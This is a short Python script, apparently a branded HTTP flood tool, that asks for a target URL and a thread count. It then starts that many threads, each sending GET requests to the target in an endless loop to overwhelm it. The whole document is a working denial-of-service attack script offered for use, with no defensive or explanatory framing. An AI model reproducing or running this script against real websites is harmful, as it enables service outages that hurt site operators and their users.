import os
import requests
import threading

def attack(target):
    try:
        while True:
            res = requests.get(target)
            print("Request sent!")
    except requests.exceptions.ConnectionError:
        print("[!!!] Connection error!")

def print_centered_red(text):
    # Change text color to red
    RED = '\033[91m'
    RESET = '\033[0m'
    
    # Get terminal window size
    try:
        columns, rows = os.get_terminal_size()
    except OSError:
        columns, rows = 80, 20

    # Center text
    lines = text.split('\n')
    centered_lines = [(line.center(columns)) for line in lines]
    centered_text = '\n'.join(centered_lines)
    
    # Print text in red
    print(RED + centered_text + RESET)

# Clear screen before printing
os.system("cls" if os.name == "nt" else "clear")

num_threads = 100

print_centered_red("""
ViBoss Studio  X   VorTex

https://github.com/dhungx/ 
""")

url = input("Enter URL: ")

try:
    num_threads = int(input("Number of threads: "))
except ValueError:
    exit("Invalid number of threads!")

if num_threads == 0:
    exit("Invalid number of threads!")

if not url.__contains__("http"):
    exit("URL does not contain http or https!")

if not url.__contains__("."):
    exit("Invalid domain name!")

for i in range(0, num_threads):
    thread = threading.Thread(target=attack, args=(url,))
    thread.start()
    print(str(i + 1) + " threads have been started!")